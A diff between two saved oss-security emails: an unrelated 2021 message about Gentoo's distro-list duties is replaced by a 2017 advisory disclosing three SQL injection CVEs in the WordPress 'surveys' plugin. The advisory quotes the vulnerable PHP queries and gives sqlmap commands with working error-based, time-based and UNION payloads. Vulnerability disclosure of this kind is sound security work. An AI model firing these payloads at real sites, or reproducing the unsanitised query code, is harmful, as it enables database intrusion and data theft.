@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1424" "Tuesday" "12" "January" "2021" "09:55:26" "-0800" "Anthony Liguori" "aliguori@amazon.com" "<cig332o8hut4z5.fsf@u54e1add816995a33037d.ant.amazon.com>" "38" "RE: [oss-security] Gentoo's \"contributing back\" linux-distros tasks" nil nil nil "1" "2021011217:55:26" "[oss-security] Gentoo's \"contributing back\" linux-distros tasks" (number mark "U       aliguori@ama Jan 12   38/1424  " thread-indent "\"RE: [oss-security] Gentoo's \"contributing back\" linux-distros tasks\"\n") "<20210112174919.GA2815@openwall.com>" ("<20201012123020.GA26643@openwall.com>" "<cig3321ri3ihti.fsf@u54e1add816995a33037d.ant.amazon.com>" "<20210110184458.GA2808@openwall.com>" "<f74590e7-e57b-08cf-aec0-9ebd251ca9ac@gentoo.org>" "<20210112174919.GA2815@openwall.com>") nil nil nil nil nil nil nil "RE: [oss-security] Gentoo's \"contributing back\" linux-distros tasks" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["5881" "Tuesday" "30" "May" "2017" "07:37:45" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<32370AEB-2D6B-40B7-8E3B-9EC152BDDDBC@me.com>" "127" "[oss-security] SQL Injection in Wordpress plugin surveys v1.01.8" nil nil nil "5" "2017053011:37:45" "[oss-security] SQL Injection in Wordpress plugin surveys v1.01.8" (number mark "U       larry0@me.co May 30  127/5881  " thread-indent "\"[oss-security] SQL Injection in Wordpress plugin surveys v1.01.8\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 18068 invoked by uid 550); 12 Jan 2021 17:58:43 -0000
+Received: (qmail 15847 invoked by uid 550); 30 May 2017 11:38:10 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,71 +12,156 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 17574 invoked from network); 12 Jan 2021 17:55:43 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-  d=amazon.com; i=@amazon.com; q=dns/txt; s=amazon201209;
-  t=1610474144; x=1642010144;
-  h=from:to:cc:subject:in-reply-to:references:date:
-   message-id:mime-version;
-  bh=+S5P+9VvPV+KlqFGIGuLsuPWp36h9KfCUBB/ELPiub8=;
-  b=dH//9hEy4zDteBek6VfubgMY4dWpjlnkznuWj5K8kvbUY2ai5ZTolBZW
-   rafIF9aeIY6ofiRlSX02uk6nKreNW7xN0sjC5IY9/uanHkscnlKyfLFQI
-   1o2wBCsvsbbmRUjWxNgpvJ7jU1LA8C74yfeiKZOzus7ZKcAdLAx5iDSWE
-   A=;
-X-IronPort-AV: E=Sophos;i="5.79,342,1602547200"; 
-   d="scan'208";a="77093045"
-From: Anthony Liguori <aliguori@amazon.com>
-To: Solar Designer <solar@openwall.com>, Thomas Deutschmann
-	<whissi@gentoo.org>
-CC: <oss-security@lists.openwall.com>
-In-Reply-To: <20210112174919.GA2815@openwall.com>
-References: <20201012123020.GA26643@openwall.com>
- <cig3321ri3ihti.fsf@u54e1add816995a33037d.ant.amazon.com>
- <20210110184458.GA2808@openwall.com>
- <f74590e7-e57b-08cf-aec0-9ebd251ca9ac@gentoo.org>
- <20210112174919.GA2815@openwall.com>
-User-Agent: Notmuch/0.21 (http://notmuchmail.org) Emacs/24.5.1 (x86_64-pc-linux-gnu)
-Date: Tue, 12 Jan 2021 09:55:26 -0800
-Message-ID: <cig332o8hut4z5.fsf@u54e1add816995a33037d.ant.amazon.com>
-MIME-Version: 1.0
-Content-Type: text/plain
-Subject: RE: [oss-security] Gentoo's "contributing back" linux-distros tasks
+Received: (qmail 15363 invoked from network); 30 May 2017 11:38:01 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
+	t=1496144269; bh=uNs/tTR91SVMCon+BFTdy23OY/uV5dWCOFKG97KPlh8=;
+	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
+	b=ctU2VFCfSc5GKsHfRBai9wYH4mPDB/T9jFReeHv0eSRMyNaXcULYfJhgH8GWrDCz3
+ vUCXL3BHMTIE98oCTFtYYXHbdN1n/DyVyK4q8kjs4fHgh+z8ezH14z4lVrYeC3QSvn
+ mTjFyTbKDwEg4edcOL0EDq6ZU83Uh0OJY1nIp+cLbdO8ctgXVQPuBjlNONkCwZt/i0
+ DQwjmvGGuDqUIu454KicN50+WoPhvmfAPDenBQqsdgWbQKV0Fr2ps+C5pGsYtM7mG9
+ yGXwrvWcUFxB+Kc68t/WLgrwSQrOr8CYWofQjlQuzie/WefJJvDXbD9qfl42Za1Zkk
+ 2tlWxKZNQXbFQ==
+X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
+ definitions=2017-05-30_08:,, signatures=0
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
+ clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
+ bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
+ engine=8.0.1-1701120000 definitions=main-1705300223
+From: "Larry W. Cashdollar" <larry0@me.com>
+Content-type: text/plain; charset=utf-8
+Content-transfer-encoding: quoted-printable
+Message-id: <32370AEB-2D6B-40B7-8E3B-9EC152BDDDBC@me.com>
+Date: Tue, 30 May 2017 07:37:45 -0400
+To: Open Source Security <oss-security@lists.openwall.com>
+MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
+X-Mailer: Apple Mail (2.3124)
+Subject: [oss-security] SQL Injection in Wordpress plugin surveys v1.01.8
 
-Solar Designer <solar@openwall.com> writes:
-> On Mon, Jan 11, 2021 at 10:09:18PM +0100, Thomas Deutschmann wrote:
->> On 2021-01-10 19:44, Solar Designer wrote:
->> >Gentoo, please let us all know whether you'd like to stay primary for
->> >these tasks, be moved to backup, or something else?
->>
->> I think we will be able to act as backup.
->
-> If possible, please stay or become primary for at least one task.  We've
-> been asking the same from newly joining distros lately.
->
->> We will need to figure out a workflow to ensure we notice when we are on
->> call but I am sure we will find a way. I'll contact Anthony directly for
->> the details.
->
-> Great to know you're coordinating with Anthony (Amazon), but a meaning
-> of backup is that you'd also need to take over when the primary fails to
-> handle a task without notifying you first.
+Title: SQL Injection in Wordpress plugin surveys v1.01.8
+Author: Larry W. Cashdollar, @_larry0
+Date: 2017-05-21
+CVE-ID:[CVE-2017-1002020][CVE-2017-1002021][CVE-2017-1002022]
+Download Site: https://wordpress.org/plugins/surveys/
+Vendor: http://www.binnyva.com/
+Vendor Notified: 2017-05-22
+Vendor Contact: binnyva@gmail.com
+Advisory: http://www.vapidlabs.com/advisory.php?v=3D193
+Description: The Surveys WordPress plugin lets you add surveys to your blog=
+. You can let the visitors take surveys and see the result from the admin s=
+ide.
+Vulnerability:
+CVE-2017-1002020:
 
-Current thinking is to setup a private git repository with the various
-scripts for generating the wiki report + a running tally of stats from
-the list.
+The following code in survey_form.php does not sanitize $_REQUEST['action']=
+ before placing it inside of an SQL query:
 
-This allows for a backup to watch the repo and make sure the stats are
-being gathered and backfill/publish if necessary.
+10:	$survey_details =3D $wpdb->get_row("SELECT name,description,status FROM=
+ {$wpdb->prefix}surveys_survey WHERE ID=3D$_REQUEST[survey]");
 
-This isn't something we had before and I think it will help solve this
-problem and also let the infrastructure be carried forward.
+CVE-2017-1002021:
 
-We can probably also publish the repository publicly as long as it
-trails by two weeks so no on-going issues are disclosed prematurely.
+The following code in individual_responses.php does not sanitize input from=
+ $survey_id or $_REQUEST[result] before placing it inside of an SQL query:
 
-Regards,
 
-Anthony Liguori
+  5 $survey_id =3D $_REQUEST['survey'];
+  6 $survey_details =3D $wpdb->get_row("SELECT ID, name FROM {$wpdb->prefix=
+}surveys_survey WHERE ID=3D$survey_id");
+  7=20
+  8 if(isset($_REQUEST['action']) and $_REQUEST['action'] =3D=3D 'delete') {
+  9         $wpdb->query("DELETE FROM {$wpdb->prefix}surveys_result_answer =
+WHERE result_ID=3D$_REQUEST[result]");
+ 10         $wpdb->query("DELETE FROM {$wpdb->prefix}surveys_result WHERE I=
+D=3D$_REQUEST[result]");
 
->
-> Alexander
+CVE-2017-1002022:
+
+In questions.php $_REQUEST[survey] is injectable as it is passed directly i=
+nto the SQL statement:
+94 $all_question =3D $wpdb->get_results("SELECT Q.ID,Q.question,(SELECT COU=
+NT(*) FROM {$wpdb->prefix}surveys_answer WHERE question_id=3DQ.ID) AS answe=
+r_count
+ 95                                                                        =
+         FROM {$wpdb->prefix}surveys_question AS Q
+ 96                                                                        =
+         WHERE Q.survey_id=3D$_REQUEST[survey]");
+
+
+Exploit Code:
+	=E2=80=A2 $ sqlmap -u 'http://192.168.0.169/wordpress/wp-admin/edit.php?pa=
+ge=3Dsurveys%2Fsurvey_form.php&survey=3D*&action=3Dedit' --dbms mysql  --le=
+vel 1 --risk 1 --load-cookies=3D./cookies.txt
+	=E2=80=A2=20=20
+	=E2=80=A2=20=20
+	=E2=80=A2 [22:45:22] [INFO] URI parameter '#1*' is 'MySQL UNION query (ran=
+dom number) - 1 to 20 columns' injectable
+	=E2=80=A2 URI parameter '#1*' is vulnerable. Do you want to keep testing t=
+he others (if any)? [y/N]=20
+	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
+of 1913 HTTP(s) requests:
+	=E2=80=A2 ---
+	=E2=80=A2 Parameter: #1* (URI)
+	=E2=80=A2     Type: error-based
+	=E2=80=A2     Title: MySQL >=3D 5.0 error-based - Parameter replace (FLOOR)
+	=E2=80=A2     Payload: http://192.168.0.169:80/wordpress/wp-admin/edit.php=
+?page=3Dsurveys/survey_form.php&survey=3D(SELECT 8079 FROM(SELECT COUNT(*),=
+CONCAT(0x7162767171,(SELECT (ELT(8079=3D8079,1))),0x71706b7171,FLOOR(RAND(0=
+)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&action=3Dedit
+	=E2=80=A2=20=20
+	=E2=80=A2     Type: AND/OR time-based blind
+	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
+	=E2=80=A2     Payload: http://192.168.0.169:80/wordpress/wp-admin/edit.php=
+?page=3Dsurveys/survey_form.php&survey=3D(CASE WHEN (5824=3D5824) THEN SLEE=
+P(5) ELSE 5824 END)&action=3Dedit
+	=E2=80=A2=20=20
+	=E2=80=A2     Type: UNION query
+	=E2=80=A2     Title: MySQL UNION query (random number) - 3 columns
+	=E2=80=A2     Payload: http://192.168.0.169:80/wordpress/wp-admin/edit.php=
+?page=3Dsurveys/survey_form.php&survey=3D-3195 UNION ALL SELECT 1509,CONCAT=
+(0x7162767171,0x49776a5a4456614e5446634579746a735757586f66776e5145566a776c4=
+5797256735a4d476f7170,0x71706b7171),1509#&action=3Dedit
+	=E2=80=A2 ---
+	=E2=80=A2 [22:45:25] [INFO] the back-end DBMS is MySQL
+	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
+	=E2=80=A2 web application technology: Apache 2.4.18
+	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0
+	=E2=80=A2 [22:45:25] [INFO] fetched data logged to text files under '/home=
+/larry/.sqlmap/output/192.168.0.169'
+	=E2=80=A2=20=20
+	=E2=80=A2 [*] shutting down at 22:45:25
+	=E2=80=A2=20=20
+	=E2=80=A2=20=20
+	=E2=80=A2 $ sqlmap -u 'http://example.com/wordpress/wp-admin/edit.php?page=
+=3Dsurveys%2Fquestion.php&survey=3D*' --dbms mysql  --level 3 --risk 3 --lo=
+ad-cookies=3D./cookies.txt
+	=E2=80=A2=20=20
+	=E2=80=A2 [14:12:16] [INFO] URI parameter '#1*' is 'Generic UNION query (r=
+andom number) - 1 to 20 columns' injectable
+	=E2=80=A2 URI parameter '#1*' is vulnerable. Do you want to keep testing t=
+he others (if any)? [y/N]=20
+	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
+of 1252 HTTP(s) requests:
+	=E2=80=A2 ---
+	=E2=80=A2 Parameter: #1* (URI)
+	=E2=80=A2     Type: AND/OR time-based blind
+	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replac=
+e (substraction)
+	=E2=80=A2     Payload: http://example.com:80/wordpress/wp-admin/edit.php?p=
+age=3Dsurveys/question.php&survey=3D(SELECT * FROM (SELECT(SLEEP(5)))rwrG)
+	=E2=80=A2=20=20
+	=E2=80=A2     Type: UNION query
+	=E2=80=A2     Title: Generic UNION query (random number) - 3 columns
+	=E2=80=A2     Payload: http://example.com:80/wordpress/wp-admin/edit.php?p=
+age=3Dsurveys/question.php&survey=3D-3214 UNION ALL SELECT CONCAT(0x716b787=
+671,0x5464416c58704b4b44675145455a565a61594371676143554e705851457371584b754=
+27a5641666d,0x7178627871),7176,7176-- yWXG
+	=E2=80=A2 ---
+	=E2=80=A2 [14:12:18] [INFO] the back-end DBMS is MySQL
+	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
+	=E2=80=A2 web application technology: Apache 2.4.18
+	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
+	=E2=80=A2 [14:12:18] [INFO] fetched data logged to text files under '/home=
+/larry/.sqlmap/output/example.com'
+	=E2=80=A2=20=20
+	=E2=80=A2 [*] shutting down at 14:12:18=
